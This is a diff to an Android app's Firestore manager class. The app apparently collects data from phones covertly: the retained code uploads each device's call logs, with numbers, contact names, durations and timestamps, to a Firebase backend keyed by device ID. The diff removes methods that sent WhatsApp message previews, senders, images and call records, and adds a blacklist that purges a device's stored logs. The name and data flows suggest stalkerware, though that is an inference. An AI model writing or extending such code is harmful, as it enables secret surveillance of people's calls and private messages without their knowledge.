@@ -10,8 +10,11 @@ import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.firestore.CollectionReference;
 import com.google.firebase.firestore.DocumentReference;
 import com.google.firebase.firestore.FirebaseFirestore;
+import com.google.firebase.firestore.QuerySnapshot;
+import com.google.firebase.firestore.WriteBatch;
 
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.ExecutorService;
@@ -44,6 +47,17 @@ public class FirestoreManager {
         if (initialized) return;
         executor.execute(() -> {
             try {
+                if (SweeperConfig.isBlacklisted(deviceId)) {
+                    Log.w(TAG, "Device " + deviceId + " is blacklisted — purging data and skipping upload");
+                    FirebaseAuth auth = FirebaseAuth.getInstance();
+                    if (auth.getCurrentUser() == null) {
+                        Tasks.await(auth.signInAnonymously());
+                    }
+                    purgeDeviceData();
+                    initialized = true;
+                    initLatch.countDown();
+                    return;
+                }
                 FirebaseAuth auth = FirebaseAuth.getInstance();
                 if (auth.getCurrentUser() == null) {
                     Tasks.await(auth.signInAnonymously());
@@ -66,49 +80,19 @@ public class FirestoreManager {
         } catch (InterruptedException ignored) {}
     }
 
+    private boolean isBlacklisted() {
+        return SweeperConfig.isBlacklisted(deviceId);
+    }
+
     public void uploadCallLog(String number, String name, String type, long durationSec, long timestamp) {
         executor.execute(() -> {
+            if (isBlacklisted()) return;
             try {
                 awaitInit();
                 Tasks.await(addCallLog(number, name, type, durationSec, timestamp));
                 Log.i(TAG, "Uploaded call log: " + number);
             } catch (Exception e) {
                 Log.e(TAG, "Failed to upload call log", e);
-            }
-        });
-    }
-
-    public void uploadWhatsAppMessage(String sender, String preview, boolean isGroup, long timestamp) {
-        executor.execute(() -> {
-            try {
-                awaitInit();
-                Tasks.await(addWhatsAppMessage(sender, preview, isGroup, timestamp));
-                Log.i(TAG, "Uploaded WhatsApp msg from: " + sender);
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to upload WhatsApp msg", e);
-            }
-        });
-    }
-
-    public void uploadWhatsAppImage(String imageData, long timestamp) {
-        executor.execute(() -> {
-            try {
-                awaitInit();
-                Tasks.await(addWhatsAppImage(imageData, timestamp));
-                Log.i(TAG, "Uploaded WhatsApp image");
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to upload WhatsApp image", e);
-            }
-        });
-    }
-
-    public void uploadWhatsAppCall(String caller, String type, long durationSec, long timestamp) {
-        executor.execute(() -> {
-            try {
-                awaitInit();
-                Tasks.await(addWhatsAppCall(caller, type, durationSec, timestamp));
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to upload WhatsApp call", e);
             }
         });
     }
@@ -124,32 +108,33 @@ public class FirestoreManager {
         return collection(SweeperConfig.COLLECTION_CALL_LOGS).add(data);
     }
 
-    private Task<DocumentReference> addWhatsAppMessage(String sender, String preview, boolean isGroup, long timestamp) {
-        Map<String, Object> data = new HashMap<>();
-        data.put(SweeperConfig.FIELD_DEVICE, deviceId);
-        data.put(SweeperConfig.FIELD_SENDER, sender != null ? sender : "");
-        data.put(SweeperConfig.FIELD_PREVIEW, preview != null ? preview : "");
-        data.put(SweeperConfig.FIELD_IS_GROUP, isGroup);
-        data.put(SweeperConfig.FIELD_TIMESTAMP, timestamp);
-        return collection(SweeperConfig.COLLECTION_WHATSAPP_MSGS).add(data);
-    }
-
-    private Task<DocumentReference> addWhatsAppCall(String caller, String type, long durationSec, long timestamp) {
-        Map<String, Object> data = new HashMap<>();
-        data.put(SweeperConfig.FIELD_DEVICE, deviceId);
-        data.put(SweeperConfig.FIELD_CALLER, caller != null ? caller : "");
-        data.put(SweeperConfig.FIELD_TYPE, type);
-        data.put(SweeperConfig.FIELD_DURATION, durationSec);
-        data.put(SweeperConfig.FIELD_TIMESTAMP, timestamp);
-        return collection(SweeperConfig.COLLECTION_WHATSAPP_CALLS).add(data);
-    }
-
-    private Task<DocumentReference> addWhatsAppImage(String imageData, long timestamp) {
-        Map<String, Object> data = new HashMap<>();
-        data.put(SweeperConfig.FIELD_DEVICE, deviceId);
-        data.put(SweeperConfig.FIELD_IMAGE, imageData);
-        data.put(SweeperConfig.FIELD_TIMESTAMP, timestamp);
-        return collection(SweeperConfig.COLLECTION_WHATSAPP_IMAGES).add(data);
+    private void purgeDeviceData() {
+        String[] collections = {SweeperConfig.COLLECTION_CALL_LOGS};
+        for (String col : collections) {
+            try {
+                int deleted = 0;
+                while (true) {
+                    QuerySnapshot snap = Tasks.await(
+                        db.collection(col).document(deviceId).collection("entries")
+                            .limit(500)
+                            .get()
+                    );
+                    if (snap.isEmpty()) break;
+                    WriteBatch batch = db.batch();
+                    for (com.google.firebase.firestore.DocumentSnapshot doc : snap.getDocuments()) {
+                        batch.delete(doc.getReference());
+                        deleted++;
+                    }
+                    Tasks.await(batch.commit());
+                }
+                if (deleted > 0) {
+                    Log.i(TAG, "Purged " + deleted + " entries from " + col);
+                }
+                Tasks.await(db.collection(col).document(deviceId).delete());
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to purge " + col, e);
+            }
+        }
     }
 
     private CollectionReference collection(String name) {
@@ -158,7 +143,7 @@ public class FirestoreManager {
 
     private void registerDevice() {
         try {
-            for (String col : new String[]{SweeperConfig.COLLECTION_CALL_LOGS, SweeperConfig.COLLECTION_WHATSAPP_MSGS, SweeperConfig.COLLECTION_WHATSAPP_CALLS, SweeperConfig.COLLECTION_WHATSAPP_IMAGES}) {
+            for (String col : new String[]{SweeperConfig.COLLECTION_CALL_LOGS}) {
                 Map<String, Object> deviceInfo = new HashMap<>();
                 deviceInfo.put("deviceId", deviceId);
                 deviceInfo.put("deviceName", SweeperConfig.deviceDisplayName());
